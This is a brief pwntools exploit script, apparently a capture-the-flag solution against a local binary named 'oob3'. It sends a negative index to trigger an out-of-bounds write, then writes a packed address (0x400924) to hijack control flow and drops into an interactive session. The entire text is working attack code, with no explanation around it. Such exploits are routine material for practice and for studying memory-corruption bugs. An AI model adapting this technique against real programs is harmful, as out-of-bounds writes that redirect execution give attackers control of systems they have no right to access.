from pwn import *
sh=process("./oob3")

sh.sendline("-19")
raw_input("waiting for syn")
sh.sendline(p64(0x400924))

sh.interactive()
